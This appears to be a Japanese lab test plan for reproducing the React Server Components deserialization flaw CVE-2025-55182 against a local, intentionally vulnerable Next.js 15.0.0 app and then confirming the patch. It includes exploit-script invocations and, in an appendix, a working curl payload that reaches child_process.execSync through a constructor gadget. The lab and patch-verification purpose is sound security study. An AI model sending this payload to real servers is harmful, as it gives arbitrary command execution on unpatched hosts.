# RSC脆弱性検証テスト計画書

## テスト概要

このドキュメントは、CVE-2025-55182（React2Shell）の脆弱性を安全な環境で検証するためのテスト計画です。

## テスト目的

1. デシリアライズ処理の脆弱性メカニズムを理解する
2. exploit-sample.jsの動作を確認する
3. 脆弱性が実際に再現可能であることを学習する
4. パッチ適用後に脆弱性が修正されることを確認する

---

## テスト環境

### 必要な環境
- WSL (Windows Subsystem for Linux)
- Node.js v25.x
- pnpm
- Next.js 15.0.0（脆弱バージョン）
- localhost:3000で動作するNext.jsアプリケーション

### 環境確認コマンド
```bash
node -v           # v25.x.x を確認
pnpm -v           # インストール確認
curl --version    # curlの動作確認
```

---

## テストケース

### テストケース1: 基本的なコマンド実行確認

**目的**: 最も単純なコマンド（`id`）でexploitが成功することを確認

**手順**:
1. Next.jsアプリケーションを起動
   ```bash
   cd /home/user/home-lab-rotten-next
   pnpm dev
   ```

2. 別のターミナルでexploit-sample.jsを実行
   ```bash
   node doc/exploit-sample.js id
   ```

**期待される結果**:
- HTTPレスポンスにユーザーID情報が含まれる
- 例: `uid=1000(user) gid=1000(user) groups=1000(user)`

**成功確認方法**:
- コンソール出力に「Response:」が表示される
- レスポンスにシステムのユーザー情報が含まれている
- エラーが発生しない

**ログ保存**:
```bash
node doc/exploit-sample.js id > proof/test1_id_output.txt 2>&1
```

---

### テストケース2: 環境変数の確認

**目的**: より複雑なコマンドでexploitが機能することを確認

**手順**:
```bash
node doc/exploit-sample.js "echo \$USER"
```

**期待される結果**:
- 現在のユーザー名が表示される
- 例: `root` または `user`

**成功確認方法**:
- レスポンスに環境変数の値が含まれている
- シェルコマンドが正しく実行されている

**ログ保存**:
```bash
node doc/exploit-sample.js "echo \$USER" > proof/test2_env_output.txt 2>&1
```

---

### テストケース3: カレントディレクトリの確認

**目的**: ファイルシステムアクセスが可能であることを確認

**手順**:
```bash
node doc/exploit-sample.js pwd
```

**期待される結果**:
- Next.jsアプリケーションのルートディレクトリパスが表示される
- 例: `/home/user/home-lab-rotten-next`

**成功確認方法**:
- 有効なファイルパスが返される
- パスがプロジェクトディレクトリを示している

**ログ保存**:
```bash
node doc/exploit-sample.js pwd > proof/test3_pwd_output.txt 2>&1
```

---

### テストケース4: ファイル一覧の取得

**目的**: コマンド実行権限の範囲を確認

**手順**:
```bash
node doc/exploit-sample.js "ls -la"
```

**期待される結果**:
- プロジェクトディレクトリのファイル一覧が表示される
- package.json、next.config.js等が確認できる

**成功確認方法**:
- ディレクトリ構造が正しく表示される
- ファイルのパーミッション情報が取得できる

**ログ保存**:
```bash
node doc/exploit-sample.js "ls -la" > proof/test4_ls_output.txt 2>&1
```

---

### テストケース5: 複数コマンドの実行

**目的**: コマンド連結が可能であることを確認

**手順**:
```bash
node doc/exploit-sample.js "whoami && hostname"
```

**期待される結果**:
- ユーザー名とホスト名の両方が表示される

**成功確認方法**:
- 両方のコマンドが順次実行される
- 出力が2行になる

**ログ保存**:
```bash
node doc/exploit-sample.js "whoami && hostname" > proof/test5_multiple_output.txt 2>&1
```

---

## 成功の判定基準

### ✅ 成功と判定する条件

1. **HTTPレスポンスが200 OK**
   - ステータスコードが正常

2. **コマンド実行結果が返る**
   - Response:の後に実行結果が表示される
   - エラーメッセージではなく、実際のコマンド出力が含まれる

3. **期待される情報が含まれる**
   - `id`: uid/gid情報
   - `whoami`: ユーザー名
   - `pwd`: ディレクトリパス
   - `ls`: ファイル一覧

4. **再現性がある**
   - 同じコマンドを複数回実行して同じ結果が得られる

### ❌ 失敗と判定する条件

1. **HTTPエラーが発生**
   - 404、500等のエラーステータス

2. **コマンドが実行されない**
   - 空のレスポンスが返る
   - "Request failed"エラーが表示される

3. **予期しない出力**
   - エラーメッセージのみが返る
   - デバッグ情報が含まれない

---

## トラブルシューティング

### 問題1: "Connection refused"エラー

**原因**: Next.jsアプリケーションが起動していない

**解決策**:
```bash
# アプリケーションが起動しているか確認
curl http://localhost:3000

# 起動していない場合
pnpm dev
```

### 問題2: "Request failed"エラー

**原因**: ペイロードが正しく送信されていない

**解決策**:
1. exploit-sample.jsのコードを確認
2. Next.jsのバージョンが15.0.0であることを確認
3. Server Actionsが有効になっているか確認

### 問題3: 空のレスポンス

**原因**: 脆弱性が存在しない（パッチ済み）

**解決策**:
1. react-server-dom-webpackのバージョンを確認
   ```bash
   pnpm list react-server-dom-webpack
   ```
2. 19.0.0〜19.2.0でない場合は、脆弱バージョンに戻す

---

## テスト実行手順

### フェーズ1: 環境準備

```bash
# 1. プロジェクトディレクトリに移動
cd /home/user/home-lab-rotten-next

# 2. 依存関係のインストール確認
pnpm install

# 3. Next.jsアプリケーションの起動
pnpm dev

# 4. 別ターミナルで接続確認
curl http://localhost:3000
```

### フェーズ2: テスト実行

```bash
# テストケース1〜5を順次実行
node doc/exploit-sample.js id
node doc/exploit-sample.js "echo \$USER"
node doc/exploit-sample.js pwd
node doc/exploit-sample.js "ls -la"
node doc/exploit-sample.js "whoami && hostname"
```

### フェーズ3: 結果記録

```bash
# 全テスト結果を記録
cat > proof/test_summary.txt <<'EOF'
# テスト実行結果サマリー

実行日時: $(date)
環境: WSL
Node.js: $(node -v)

## テストケース1: id
$(node doc/exploit-sample.js id)

## テストケース2: echo $USER
$(node doc/exploit-sample.js "echo \$USER")

## テストケース3: pwd
$(node doc/exploit-sample.js pwd)

## テストケース4: ls -la
$(node doc/exploit-sample.js "ls -la")

## テストケース5: whoami && hostname
$(node doc/exploit-sample.js "whoami && hostname")
EOF
```

---

## ログ記録フォーマット

各テストの結果は以下の形式で保存します：

### ファイル命名規則
```
proof/test{番号}_{テスト名}_output.txt
```

### ログ内容
```
=== テスト実行情報 ===
日時: YYYY-MM-DD HH:MM:SS
テスト名: {テスト名}
コマンド: {実行したコマンド}

=== 実行結果 ===
{コマンド出力}

=== 判定 ===
成功/失敗: {判定結果}
備考: {追加情報}
```

---

## パッチ適用後の検証

### 手順

1. **react-server-dom-webpackをアップグレード**
   ```bash
   pnpm add react-server-dom-webpack@19.3.0
   ```

2. **アプリケーション再起動**
   ```bash
   pnpm dev
   ```

3. **同じテストを再実行**
   ```bash
   node doc/exploit-sample.js id
   ```

4. **期待される結果**
   - エラーが発生する、または
   - コマンドが実行されない
   - 脆弱性が修正されたことを確認

5. **ログ記録**
   ```bash
   node doc/exploit-sample.js id > proof/test_patched_output.txt 2>&1
   ```

---

## 学習ポイント

### テストを通じて学ぶこと

1. **デシリアライズの危険性**
   - 信頼できないデータのデシリアライズがなぜ危険か

2. **入力検証の重要性**
   - `.constructor`や`.prototype`へのアクセス制御

3. **バージョン管理の重要性**
   - 脆弱性のあるバージョンとパッチ版の違い

4. **セキュアコーディング**
   - Server Actionsの適切な実装方法

---

## テスト完了チェックリスト

- [ ] テストケース1（id）成功
- [ ] テストケース2（echo $USER）成功
- [ ] テストケース3（pwd）成功
- [ ] テストケース4（ls -la）成功
- [ ] テストケース5（whoami && hostname）成功
- [ ] すべての結果をproof/ディレクトリに保存
- [ ] test_summary.txtを作成
- [ ] パッチ適用後の検証実施
- [ ] パッチ後にexploitが失敗することを確認
- [ ] 学習内容をドキュメント化

---

## 補足: curlを使った手動テスト

より詳細な検証を行う場合、curlで直接ペイロードを送信できます：

```bash
curl -X POST http://localhost:3000 \
  -H "Content-Type: multipart/form-data" \
  -F '0="$F1"' \
  -F '1={"id":"user-profile-action#constructor","bound":"$@2"}' \
  -F '2=["const cmd = \"id\"; return import(\"child_process\").then(cp => { const output = cp.execSync(cmd).toString(); return output; }).catch(e => console.log(\"err:\", e.message));"]' \
  -v
```

この方法では、HTTPリクエスト/レスポンスの詳細を確認できます。

---

## 次のステップ

テスト完了後：
1. 検証レポートの作成（proof/VERIFICATION_REPORT.md）
2. 学習内容の整理
3. チーム向けプレゼンテーション資料の準備
4. INSTRUCTIONS.mdの開発計画チェックリストを更新
